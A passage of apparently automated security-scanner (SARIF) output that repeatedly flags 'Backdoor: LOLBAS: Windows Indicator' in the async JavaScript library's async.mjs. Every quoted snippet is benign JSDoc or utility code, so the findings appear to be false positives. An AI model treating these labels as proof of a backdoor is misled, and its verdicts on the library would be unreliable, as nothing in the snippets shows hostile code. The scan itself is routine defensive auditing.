                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/dist/async.mjs"
                },
                "region": {
                  "startLine": 4573,
                  "startColumn": 45,
                  "endLine": 4573,
                  "endColumn": 49,
                  "snippet": {
                    "text": " * Invoked with (callback).\n * @param {Function} [callback] - An optional callback which is called when the\n * task has succeeded, or after the final failed attempt. It receives the `err`\n * and `result` arguments of the last attempt at completing the `task`. Invoked\n * with (err, results).\n * @returns {Promise} a promise if no callback provided\n *\n",
                    "rendered": {
                      "text": " * Invoked with (callback).\n * @param {Function} [callback] - An optional callback which is called when the\n * task has succeeded, or after the final failed attempt. It receives the `err`\n * and `result` arguments of the last attempt at completing the `task`. Invoked\n * with (err, results).\n * @returns {Promise} a promise if no callback provided\n *\n",
                      "markdown": "` * Invoked with (callback).\n * @param {Function} [callback] - An optional callback which is called when the\n * task has succeeded, or after the final failed attempt. It receives the `err`\n * and `result` arguments of the last attempt at completing the `task`. Invoked\n * with (err, results).\n * @returns {Promise} a promise if no callback provided\n *\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/dist/async.mjs"
                },
                "region": {
                  "startLine": 4553,
                  "startColumn": 12,
                  "endLine": 4553,
                  "endColumn": 21,
                  "snippet": {
                    "text": " * @static\n * @memberOf module:ControlFlow\n * @method\n * @category Control Flow\n * @see [async.retryable]{@link module:ControlFlow.retryable}\n * @param {Object|number} [opts = {times: 5, interval: 0}| 5] - Can be either an\n * object with `times` and `interval` or a number.\n",
                    "rendered": {
                      "text": " * @static\n * @memberOf module:ControlFlow\n * @method\n * @category Control Flow\n * @see [async.retryable]{@link module:ControlFlow.retryable}\n * @param {Object|number} [opts = {times: 5, interval: 0}| 5] - Can be either an\n * object with `times` and `interval` or a number.\n",
                      "markdown": "` * @static\n * @memberOf module:ControlFlow\n * @method\n * @category Control Flow\n * @see [async.retryable]{@link module:ControlFlow.retryable}\n * @param {Object|number} [opts = {times: 5, interval: 0}| 5] - Can be either an\n * object with `times` and `interval` or a number.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/dist/async.mjs"
                },
                "region": {
                  "startLine": 4515,
                  "startColumn": 97,
                  "endLine": 4515,
                  "endColumn": 101,
                  "snippet": {
                    "text": "var rejectLimit$1 = awaitify(rejectLimit, 4);\n\n/**\n * The same as [`reject`]{@link module:Collections.reject} but runs only a single async operation at a time.\n *\n * @name rejectSeries\n * @static\n",
                    "rendered": {
                      "text": "var rejectLimit$1 = awaitify(rejectLimit, 4);\n\n/**\n * The same as [`reject`]{@link module:Collections.reject} but runs only a single async operation at a time.\n *\n * @name rejectSeries\n * @static\n",
                      "markdown": "`var rejectLimit$1 = awaitify(rejectLimit, 4);\n\n/**\n * The same as [`reject`]{@link module:Collections.reject} but runs only a single async operation at a time.\n *\n * @name rejectSeries\n * @static\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/dist/async.mjs"
                },
                "region": {
                  "startLine": 4500,
                  "startColumn": 65,
                  "endLine": 4500,
                  "endColumn": 69,
                  "snippet": {
                    "text": " * @see [async.reject]{@link module:Collections.reject}\n * @category Collection\n * @param {Array|Iterable|AsyncIterable|Object} coll - A collection to iterate over.\n * @param {number} limit - The maximum number of async operations at a time.\n * @param {Function} iteratee - An async truth test to apply to each item in\n * `coll`.\n * The should complete with a boolean value as its `result`.\n",
                    "rendered": {
                      "text": " * @see [async.reject]{@link module:Collections.reject}\n * @category Collection\n * @param {Array|Iterable|AsyncIterable|Object} coll - A collection to iterate over.\n * @param {number} limit - The maximum number of async operations at a time.\n * @param {Function} iteratee - An async truth test to apply to each item in\n * `coll`.\n * The should complete with a boolean value as its `result`.\n",
                      "markdown": "` * @see [async.reject]{@link module:Collections.reject}\n * @category Collection\n * @param {Array|Iterable|AsyncIterable|Object} coll - A collection to iterate over.\n * @param {number} limit - The maximum number of async operations at a time.\n * @param {Function} iteratee - An async truth test to apply to each item in\n * `coll`.\n * The should complete with a boolean value as its `result`.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/dist/async.mjs"
                },
                "region": {
                  "startLine": 4490,
                  "startColumn": 105,
                  "endLine": 4490,
                  "endColumn": 109,
                  "snippet": {
                    "text": "var reject$1 = awaitify(reject, 3);\n\n/**\n * The same as [`reject`]{@link module:Collections.reject} but runs a maximum of `limit` async operations at a\n * time.\n *\n * @name rejectLimit\n",
                    "rendered": {
                      "text": "var reject$1 = awaitify(reject, 3);\n\n/**\n * The same as [`reject`]{@link module:Collections.reject} but runs a maximum of `limit` async operations at a\n * time.\n *\n * @name rejectLimit\n",
                      "markdown": "`var reject$1 = awaitify(reject, 3);\n\n/**\n * The same as [`reject`]{@link module:Collections.reject} but runs a maximum of `limit` async operations at a\n * time.\n *\n * @name rejectLimit\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/dist/async.mjs"
                },
                "region": {
                  "startLine": 4207,
                  "startColumn": 12,
                  "endLine": 4207,
                  "endColumn": 21,
                  "snippet": {
                    "text": " * @static\n * @memberOf module:ControlFlow\n * @method\n * @category Control Flow\n * @param {Array} tasks - An array containing [async functions]{@link AsyncFunction}\n * to run. Each function can complete with an optional `result` value.\n * @param {Function} callback - A callback to run once any of the functions have\n",
                    "rendered": {
                      "text": " * @static\n * @memberOf module:ControlFlow\n * @method\n * @category Control Flow\n * @param {Array} tasks - An array containing [async functions]{@link AsyncFunction}\n * to run. Each function can complete with an optional `result` value.\n * @param {Function} callback - A callback to run once any of the functions have\n",
                      "markdown": "` * @static\n * @memberOf module:ControlFlow\n * @method\n * @category Control Flow\n * @param {Array} tasks - An array containing [async functions]{@link AsyncFunction}\n * to run. Each function can complete with an optional `result` value.\n * @param {Function} callback - A callback to run once any of the functions have\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/dist/async.mjs"
                },
                "region": {
                  "startLine": 4140,
                  "startColumn": 12,
                  "endLine": 4140,
                  "endColumn": 21,
                  "snippet": {
                    "text": " * @memberOf module:ControlFlow\n * @method\n * @see [async.queue]{@link module:ControlFlow.queue}\n * @category Control Flow\n * @param {AsyncFunction} worker - An async function for processing a queued task.\n * If you want to handle errors from an individual task, pass a callback to\n * `q.push()`.\n",
                    "rendered": {
                      "text": " * @memberOf module:ControlFlow\n * @method\n * @see [async.queue]{@link module:ControlFlow.queue}\n * @category Control Flow\n * @param {AsyncFunction} worker - An async function for processing a queued task.\n * If you want to handle errors from an individual task, pass a callback to\n * `q.push()`.\n",
                      "markdown": "` * @memberOf module:ControlFlow\n * @method\n * @see [async.queue]{@link module:ControlFlow.queue}\n * @category Control Flow\n * @param {AsyncFunction} worker - An async function for processing a queued task.\n * If you want to handle errors from an individual task, pass a callback to\n * `q.push()`.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/dist/async.mjs"
                },
                "region": {
                  "startLine": 3962,
                  "startColumn": 12,
                  "endLine": 3962,
                  "endColumn": 21,
                  "snippet": {
                    "text": " * @static\n * @memberOf module:ControlFlow\n * @method\n * @category Control Flow\n * @param {AsyncFunction} worker - An async function for processing a queued task.\n * If you want to handle errors from an individual task, pass a callback to\n * `q.push()`. Invoked with (task, callback).\n",
                    "rendered": {
                      "text": " * @static\n * @memberOf module:ControlFlow\n * @method\n * @category Control Flow\n * @param {AsyncFunction} worker - An async function for processing a queued task.\n * If you want to handle errors from an individual task, pass a callback to\n * `q.push()`. Invoked with (task, callback).\n",
                      "markdown": "` * @static\n * @memberOf module:ControlFlow\n * @method\n * @category Control Flow\n * @param {AsyncFunction} worker - An async function for processing a queued task.\n * If you want to handle errors from an individual task, pass a callback to\n * `q.push()`. Invoked with (task, callback).\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/dist/async.mjs"
                },
                "region": {
                  "startLine": 3885,
                  "startColumn": 32,
                  "endLine": 3885,
                  "endColumn": 36,
                  "snippet": {
                    "text": " * functions should be run in parallel. This property can be changed after a\n * `queue` is created to alter the concurrency on-the-fly.\n * @property {number} payload - an integer that specifies how many items are\n * passed to the worker function at a time. only applies if this is a\n * [cargo]{@link module:ControlFlow.cargo} object\n * @property {AsyncFunction} push - add a new task to the `queue`. Calls `callback`\n * once the `worker` has finished processing the task. Instead of a single task,\n",
                    "rendered": {
                      "text": " * functions should be run in parallel. This property can be changed after a\n * `queue` is created to alter the concurrency on-the-fly.\n * @property {number} payload - an integer that specifies how many items are\n * passed to the worker function at a time. only applies if this is a\n * [cargo]{@link module:ControlFlow.cargo} object\n * @property {AsyncFunction} push - add a new task to the `queue`. Calls `callback`\n * once the `worker` has finished processing the task. Instead of a single task,\n",
                      "markdown": "` * functions should be run in parallel. This property can be changed after a\n * `queue` is created to alter the concurrency on-the-fly.\n * @property {number} payload - an integer that specifies how many items are\n * passed to the worker function at a time. only applies if this is a\n * [cargo]{@link module:ControlFlow.cargo} object\n * @property {AsyncFunction} push - add a new task to the `queue`. Calls `callback`\n * once the `worker` has finished processing the task. Instead of a single task,\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/dist/async.mjs"
                },
                "region": {
                  "startLine": 3856,
                  "startColumn": 65,
                  "endLine": 3856,
                  "endColumn": 69,
                  "snippet": {
                    "text": " * @param {Array|Iterable|AsyncIterable|Object} tasks - A collection of\n * [async functions]{@link AsyncFunction} to run.\n * Each async function can complete with any number of optional `result` values.\n * @param {number} limit - The maximum number of async operations at a time.\n * @param {Function} [callback] - An optional callback to run once all the\n * functions have completed successfully. This function gets a results array\n * (or object) containing all the result arguments passed to the task callbacks.\n",
                    "rendered": {
                      "text": " * @param {Array|Iterable|AsyncIterable|Object} tasks - A collection of\n * [async functions]{@link AsyncFunction} to run.\n * Each async function can complete with any number of optional `result` values.\n * @param {number} limit - The maximum number of async operations at a time.\n * @param {Function} [callback] - An optional callback to run once all the\n * functions have completed successfully. This function gets a results array\n * (or object) containing all the result arguments passed to the task callbacks.\n",
                      "markdown": "` * @param {Array|Iterable|AsyncIterable|Object} tasks - A collection of\n * [async functions]{@link AsyncFunction} to run.\n * Each async function can complete with any number of optional `result` values.\n * @param {number} limit - The maximum number of async operations at a time.\n * @param {Function} [callback] - An optional callback to run once all the\n * functions have completed successfully. This function gets a results array\n * (or object) containing all the result arguments passed to the task callbacks.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/dist/async.mjs"
                },
                "region": {
                  "startLine": 3852,
                  "startColumn": 12,
                  "endLine": 3852,
                  "endColumn": 21,
                  "snippet": {
                    "text": " * @memberOf module:ControlFlow\n * @method\n * @see [async.parallel]{@link module:ControlFlow.parallel}\n * @category Control Flow\n * @param {Array|Iterable|AsyncIterable|Object} tasks - A collection of\n * [async functions]{@link AsyncFunction} to run.\n * Each async function can complete with any number of optional `result` values.\n",
                    "rendered": {
                      "text": " * @memberOf module:ControlFlow\n * @method\n * @see [async.parallel]{@link module:ControlFlow.parallel}\n * @category Control Flow\n * @param {Array|Iterable|AsyncIterable|Object} tasks - A collection of\n * [async functions]{@link AsyncFunction} to run.\n * Each async function can complete with any number of optional `result` values.\n",
                      "markdown": "` * @memberOf module:ControlFlow\n * @method\n * @see [async.parallel]{@link module:ControlFlow.parallel}\n * @category Control Flow\n * @param {Array|Iterable|AsyncIterable|Object} tasks - A collection of\n * [async functions]{@link AsyncFunction} to run.\n * Each async function can complete with any number of optional `result` values.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/dist/async.mjs"
                },
                "region": {
                  "startLine": 3844,
                  "startColumn": 109,
                  "endLine": 3844,
                  "endColumn": 113,
                  "snippet": {
                    "text": "}\n\n/**\n * The same as [`parallel`]{@link module:ControlFlow.parallel} but runs a maximum of `limit` async operations at a\n * time.\n *\n * @name parallelLimit\n",
                    "rendered": {
                      "text": "}\n\n/**\n * The same as [`parallel`]{@link module:ControlFlow.parallel} but runs a maximum of `limit` async operations at a\n * time.\n *\n * @name parallelLimit\n",
                      "markdown": "`}\n\n/**\n * The same as [`parallel`]{@link module:ControlFlow.parallel} but runs a maximum of `limit` async operations at a\n * time.\n *\n * @name parallelLimit\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/dist/async.mjs"
                },
                "region": {
                  "startLine": 3705,
                  "startColumn": 12,
                  "endLine": 3705,
                  "endColumn": 21,
                  "snippet": {
                    "text": " * @static\n * @memberOf module:ControlFlow\n * @method\n * @category Control Flow\n * @param {Array|Iterable|AsyncIterable|Object} tasks - A collection of\n * [async functions]{@link AsyncFunction} to run.\n * Each async function can complete with any number of optional `result` values.\n",
                    "rendered": {
                      "text": " * @static\n * @memberOf module:ControlFlow\n * @method\n * @category Control Flow\n * @param {Array|Iterable|AsyncIterable|Object} tasks - A collection of\n * [async functions]{@link AsyncFunction} to run.\n * Each async function can complete with any number of optional `result` values.\n",
                      "markdown": "` * @static\n * @memberOf module:ControlFlow\n * @method\n * @category Control Flow\n * @param {Array|Iterable|AsyncIterable|Object} tasks - A collection of\n * [async functions]{@link AsyncFunction} to run.\n * Each async function can complete with any number of optional `result` values.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/dist/async.mjs"
                },
                "region": {
                  "startLine": 3528,
                  "startColumn": 103,
                  "endLine": 3528,
                  "endColumn": 107,
                  "snippet": {
                    "text": "}\n\n/**\n * The same as [`mapValues`]{@link module:Collections.mapValues} but runs only a single async operation at a time.\n *\n * @name mapValuesSeries\n * @static\n",
                    "rendered": {
                      "text": "}\n\n/**\n * The same as [`mapValues`]{@link module:Collections.mapValues} but runs only a single async operation at a time.\n *\n * @name mapValuesSeries\n * @static\n",
                      "markdown": "`}\n\n/**\n * The same as [`mapValues`]{@link module:Collections.mapValues} but runs only a single async operation at a time.\n *\n * @name mapValuesSeries\n * @static\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/dist/async.mjs"
                },
                "region": {
                  "startLine": 3362,
                  "startColumn": 65,
                  "endLine": 3362,
                  "endColumn": 69,
                  "snippet": {
                    "text": " * @see [async.mapValues]{@link module:Collections.mapValues}\n * @category Collection\n * @param {Object} obj - A collection to iterate over.\n * @param {number} limit - The maximum number of async operations at a time.\n * @param {AsyncFunction} iteratee - A function to apply to each value and key\n * in `coll`.\n * The iteratee should complete with the transformed value as its result.\n",
                    "rendered": {
                      "text": " * @see [async.mapValues]{@link module:Collections.mapValues}\n * @category Collection\n * @param {Object} obj - A collection to iterate over.\n * @param {number} limit - The maximum number of async operations at a time.\n * @param {AsyncFunction} iteratee - A function to apply to each value and key\n * in `coll`.\n * The iteratee should complete with the transformed value as its result.\n",
                      "markdown": "` * @see [async.mapValues]{@link module:Collections.mapValues}\n * @category Collection\n * @param {Object} obj - A collection to iterate over.\n * @param {number} limit - The maximum number of async operations at a time.\n * @param {AsyncFunction} iteratee - A function to apply to each value and key\n * in `coll`.\n * The iteratee should complete with the transformed value as its result.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/dist/async.mjs"
                },
                "region": {
                  "startLine": 3352,
                  "startColumn": 111,
                  "endLine": 3352,
                  "endColumn": 115,
                  "snippet": {
                    "text": "var log = consoleFunc('log');\n\n/**\n * The same as [`mapValues`]{@link module:Collections.mapValues} but runs a maximum of `limit` async operations at a\n * time.\n *\n * @name mapValuesLimit\n",
                    "rendered": {
                      "text": "var log = consoleFunc('log');\n\n/**\n * The same as [`mapValues`]{@link module:Collections.mapValues} but runs a maximum of `limit` async operations at a\n * time.\n *\n * @name mapValuesLimit\n",
                      "markdown": "`var log = consoleFunc('log');\n\n/**\n * The same as [`mapValues`]{@link module:Collections.mapValues} but runs a maximum of `limit` async operations at a\n * time.\n *\n * @name mapValuesLimit\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/dist/async.mjs"
                },
                "region": {
                  "startLine": 3300,
                  "startColumn": 99,
                  "endLine": 3300,
                  "endColumn": 103,
                  "snippet": {
                    "text": "}\n\n/**\n * The same as [`groupBy`]{@link module:Collections.groupBy} but runs only a single async operation at a time.\n *\n * @name groupBySeries\n * @static\n",
                    "rendered": {
                      "text": "}\n\n/**\n * The same as [`groupBy`]{@link module:Collections.groupBy} but runs only a single async operation at a time.\n *\n * @name groupBySeries\n * @static\n",
                      "markdown": "`}\n\n/**\n * The same as [`groupBy`]{@link module:Collections.groupBy} but runs only a single async operation at a time.\n *\n * @name groupBySeries\n * @static\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/dist/async.mjs"
                },
                "region": {
                  "startLine": 3163,
                  "startColumn": 65,
                  "endLine": 3163,
                  "endColumn": 69,
                  "snippet": {
                    "text": " * @see [async.groupBy]{@link module:Collections.groupBy}\n * @category Collection\n * @param {Array|Iterable|AsyncIterable|Object} coll - A collection to iterate over.\n * @param {number} limit - The maximum number of async operations at a time.\n * @param {AsyncFunction} iteratee - An async function to apply to each item in\n * `coll`.\n * The iteratee should complete with a `key` to group the value under.\n",
                    "rendered": {
                      "text": " * @see [async.groupBy]{@link module:Collections.groupBy}\n * @category Collection\n * @param {Array|Iterable|AsyncIterable|Object} coll - A collection to iterate over.\n * @param {number} limit - The maximum number of async operations at a time.\n * @param {AsyncFunction} iteratee - An async function to apply to each item in\n * `coll`.\n * The iteratee should complete with a `key` to group the value under.\n",
                      "markdown": "` * @see [async.groupBy]{@link module:Collections.groupBy}\n * @category Collection\n * @param {Array|Iterable|AsyncIterable|Object} coll - A collection to iterate over.\n * @param {number} limit - The maximum number of async operations at a time.\n * @param {AsyncFunction} iteratee - An async function to apply to each item in\n * `coll`.\n * The iteratee should complete with a `key` to group the value under.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/dist/async.mjs"
                },
                "region": {
                  "startLine": 3154,
                  "startColumn": 107,
                  "endLine": 3154,
                  "endColumn": 111,
                  "snippet": {
                    "text": "var forever$1 = awaitify(forever, 2);\n\n/**\n * The same as [`groupBy`]{@link module:Collections.groupBy} but runs a maximum of `limit` async operations at a time.\n *\n * @name groupByLimit\n * @static\n",
                    "rendered": {
                      "text": "var forever$1 = awaitify(forever, 2);\n\n/**\n * The same as [`groupBy`]{@link module:Collections.groupBy} but runs a maximum of `limit` async operations at a time.\n *\n * @name groupByLimit\n * @static\n",
                      "markdown": "`var forever$1 = awaitify(forever, 2);\n\n/**\n * The same as [`groupBy`]{@link module:Collections.groupBy} but runs a maximum of `limit` async operations at a time.\n *\n * @name groupByLimit\n * @static\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/dist/async.mjs"
                },
                "region": {
                  "startLine": 3120,
                  "startColumn": 12,
                  "endLine": 3120,
                  "endColumn": 21,
                  "snippet": {
                    "text": " * @static\n * @memberOf module:ControlFlow\n * @method\n * @category Control Flow\n * @param {AsyncFunction} fn - an async function to call repeatedly.\n * Invoked with (next).\n * @param {Function} [errback] - when `fn` passes an error to it's callback,\n",
                    "rendered": {
                      "text": " * @static\n * @memberOf module:ControlFlow\n * @method\n * @category Control Flow\n * @param {AsyncFunction} fn - an async function to call repeatedly.\n * Invoked with (next).\n * @param {Function} [errback] - when `fn` passes an error to it's callback,\n",
                      "markdown": "` * @static\n * @memberOf module:ControlFlow\n * @method\n * @category Control Flow\n * @param {AsyncFunction} fn - an async function to call repeatedly.\n * Invoked with (next).\n * @param {Function} [errback] - when `fn` passes an error to it's callback,\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/dist/async.mjs"
                },
                "region": {
                  "startLine": 3087,
                  "startColumn": 97,
                  "endLine": 3087,
                  "endColumn": 101,
                  "snippet": {
                    "text": "var filterLimit$1 = awaitify(filterLimit, 4);\n\n/**\n * The same as [`filter`]{@link module:Collections.filter} but runs only a single async operation at a time.\n *\n * @name filterSeries\n * @static\n",
                    "rendered": {
                      "text": "var filterLimit$1 = awaitify(filterLimit, 4);\n\n/**\n * The same as [`filter`]{@link module:Collections.filter} but runs only a single async operation at a time.\n *\n * @name filterSeries\n * @static\n",
                      "markdown": "`var filterLimit$1 = awaitify(filterLimit, 4);\n\n/**\n * The same as [`filter`]{@link module:Collections.filter} but runs only a single async operation at a time.\n *\n * @name filterSeries\n * @static\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
